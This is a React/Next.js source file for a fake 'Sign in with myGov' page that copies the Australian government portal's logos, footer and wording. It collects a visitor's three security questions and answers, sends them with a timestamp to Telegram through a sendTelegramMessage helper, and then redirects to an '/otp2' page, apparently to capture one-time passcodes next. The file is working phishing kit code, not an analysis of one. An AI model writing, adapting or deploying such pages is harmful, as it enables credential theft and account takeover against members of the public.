"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import Image from "next/image";
import { sendTelegramMessage } from "../../utils/telegram";

export default function SecurityQuestionsForm() {
  const [showCustomQuestion1, setShowCustomQuestion1] = useState(false);
  const [showCustomQuestion2, setShowCustomQuestion2] = useState(false);
  const [showCustomQuestion3, setShowCustomQuestion3] = useState(false);
  const router = useRouter();

  const handleQuestionChange = (event: React.ChangeEvent<HTMLSelectElement>, setShowCustomQuestion: React.Dispatch<React.SetStateAction<boolean>>) => {
    const value = event.target.value;
    setShowCustomQuestion(value === "x");
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const formData = new FormData(e.currentTarget);
    const formEntries = Object.fromEntries(formData.entries());

    const message = `
      🚨 Security Questions Submitted 🚨
      - Security Question 1: ${formEntries.sec_q_1 || formEntries.sec_q_11}
      - Answer 1: ${formEntries.sec_a_1}
      - Security Question 2: ${formEntries.sec_q_2 || formEntries.sec_q_22}
      - Answer 2: ${formEntries.sec_a_2}
      - Security Question 3: ${formEntries.sec_q_3 || formEntries.sec_q_33}
      - Answer 3: ${formEntries.sec_a_3}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      await sendTelegramMessage(message);
      
      router.push("/otp2"); // Redirect to OTP page after submission
    } catch (err) {
      console.error("Failed to send data to Telegram:", err);
      alert("Failed to submit the form. Please try again.");
    }
  };

  return (
    <>
      <Head>
        <title>Sign in with myGov - myGov</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
       
        <link
          href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap"
          rel="stylesheet"
        />
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        {/* Header */}
        <header className="bg-[#66d3ee] border-b-4 border-[#5bbad7]">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="https://beta.my.gov.au/" className="flex items-center">
              <Image
                src="/images/myGov-cobranded-logo-black.svg"
                alt="myGov Beta"
                width={150}
                height={40}
                className="h-10"
              />
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
              Sign in with myGov
            </h1>
            <h2 className="text-lg text-gray-700 mb-8">
              Verify your Security Questions
            </h2>
            <form onSubmit={handleFormSubmit} className="space-y-6">
              {/* Security Question 1 */}
              <div>
                <label
                  htmlFor="sec_q_1"
                  className="block text-sm font-medium text-black"
                >
                  Security Question 1
                </label>
                <select
                  id="sec_q_1"
                  name="sec_q_1"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  onChange={(e) =>
                    handleQuestionChange(e, setShowCustomQuestion1)
                  }
                >
                  <option value="0">Select Your Security Question</option>
                  <option value="What was the first single/album I bought?">
                    What was the first single/album I bought?
                  </option>
                  <option value="What was the first live concert I went to?">
                    What was the first live concert I went to?
                  </option>
                  <option value="What is the name of the primary school I attended?">
                    What is the name of the primary school I attended?
                  </option>
                  <option value="x">Write your own question</option>
                </select>
                {showCustomQuestion1 && (
                  <input
                    type="text"
                    name="sec_q_11"
                    className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                    placeholder="Enter your own question"
                  />
                )}
                <input
                  type="text"
                  name="sec_a_1"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  placeholder="Enter Security Answer"
                  required
                />
              </div>

              {/* Security Question 2 */}
              <div>
                <label
                  htmlFor="sec_q_2"
                  className="block text-sm font-medium text-black"
                >
                  Security Question 2
                </label>
                <select
                  id="sec_q_2"
                  name="sec_q_2"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  onChange={(e) =>
                    handleQuestionChange(e, setShowCustomQuestion2)
                  }
                >
                  <option value="0">Select Your Security Question</option>
                  <option value="What was my favorite childhood book?">
                    What was my favorite childhood book?
                  </option>
                  <option value="What was my nickname at school?">
                    What was my nickname at school?
                  </option>
                  <option value="x">Write your own question</option>
                </select>
                {showCustomQuestion2 && (
                  <input
                    type="text"
                    name="sec_q_22"
                    className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                    placeholder="Enter your own question"
                  />
                )}
                <input
                  type="text"
                  name="sec_a_2"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  placeholder="Enter Security Answer"
                  required
                />
              </div>

              {/* Security Question 3 */}
              <div>
                <label
                  htmlFor="sec_q_3"
                  className="block text-sm font-medium text-black"
                >
                  Security Question 3
                </label>
                <select
                  id="sec_q_3"
                  name="sec_q_3"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  onChange={(e) =>
                    handleQuestionChange(e, setShowCustomQuestion3)
                  }
                >
                  <option value="0">Select Your Security Question</option>
                  <option value="What is my most memorable moment in my adult life?">
                    What is my most memorable moment in my adult life?
                  </option>
                  <option value="What was the name of my first pet?">
                    What was the name of my first pet?
                  </option>
                  <option value="x">Write your own question</option>
                </select>
                {showCustomQuestion3 && (
                  <input
                    type="text"
                    name="sec_q_33"
                    className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                    placeholder="Enter your own question"
                  />
                )}
                <input
                  type="text"
                  name="sec_a_3"
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
                  placeholder="Enter Security Answer"
                  required
                />
              </div>

              {/* Submit and Skip Buttons */}
              <div className="flex items-center justify-between">
                <button
                  type="submit"
                  className="px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition focus:outline-none focus:ring-2 focus:ring-blue-600"
                >
                  Continue
                </button>
                <button
                  type="button"
                  onClick={() => router.push("/otp2")}
                  className="text-blue-600 hover:underline focus:outline-none"
                >
                  Skip
                </button>
              </div>
            </form>
          </div>
        </main>

        {/* Footer */}
        <footer className="bg-gray-900 text-white py-10 mt-12">
          <div className="container mx-auto text-center">
            <ul className="flex justify-center space-x-6 mb-4 text-sm">
              <li>
                <a
                  href="https://my.gov.au/en/about/terms"
                  target="_blank"
                  className="hover:underline focus:outline-none"
                >
                  Terms of use
                </a>
              </li>
              <li>
                <a
                  href="https://my.gov.au/en/about/privacy-and-security"
                  target="_blank"
                  className="hover:underline focus:outline-none"
                >
                  Privacy and security
                </a>
              </li>
              <li>
                <a
                  href="https://my.gov.au/en/about/copyright"
                  target="_blank"
                  className="hover:underline focus:outline-none"
                >
                  Copyright
                </a>
              </li>
              <li>
                <a
                  href="https://my.gov.au/en/about/accessibility"
                  target="_blank"
                  className="hover:underline focus:outline-none"
                >
                  Accessibility
                </a>
              </li>
            </ul>
            <Image
              src="/images/myGov-cobranded-logo-white.svg"
              alt="myGov Beta"
              width={150}
              height={40}
              className="h-10 mx-auto"
            />
            <p className="mt-6 text-sm">
              We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </footer>
      </div>
    </>
  );
}
